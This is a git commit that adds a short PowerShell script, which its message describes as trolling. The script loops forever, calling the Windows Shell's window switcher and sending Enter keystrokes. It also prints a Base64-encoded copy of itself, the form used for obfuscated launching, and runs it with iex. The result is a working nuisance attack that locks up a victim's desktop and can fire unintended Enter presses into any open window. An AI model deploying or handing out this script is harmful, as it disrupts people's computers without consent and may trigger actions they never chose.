579847b700915e8c603b8a756342b862329c6245
potatoes-and-molasses <eedoshapira@gmail.com>
2017-12-03 13:06:30 +0200

    trolling is not a proper way to spend your time. but this is pretty fun:)

---
+++ windowswitch.ps1
@@ -0,0 +1,5 @@
+﻿$st='$a=[activator]::CreateInstance([type]::gettypefromclsid("9ba05972-f6a8-11cf-a442-00a0c90a8f39")).item().document.application;$w=New-Object -ComObject wscript.shell;while(1){$a.WindowSwitcher();$w.SendKeys("~")}'
+[convert]::ToBase64String([text.encoding]::Unicode.GetBytes($st))
+
+iex $st
+
